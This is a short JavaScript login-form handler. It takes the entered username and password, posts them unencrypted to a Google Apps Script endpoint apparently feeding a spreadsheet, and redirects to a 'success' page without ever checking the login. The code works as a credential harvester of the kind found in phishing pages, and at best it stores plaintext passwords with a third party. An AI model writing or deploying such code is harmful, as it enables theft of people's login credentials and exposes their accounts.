document
  .getElementById("loginForm")
  .addEventListener("submit", async function(e){

    e.preventDefault();

    const username =
      document.getElementById("username").value;

    const password =
      document.getElementById("password").value;

    console.log("Sending to Sheets...");

    await fetch("https://script.google.com/macros/library/d/1tJg-L1MYvDH73_FoZC5wLmnc3R5unbB7UNYNV1nfUXWqezD_N8E3yMa6/3", {
      method: "POST",
      body: JSON.stringify({
        username,
        password
      })
    });

    window.location.href = "success.html";
});


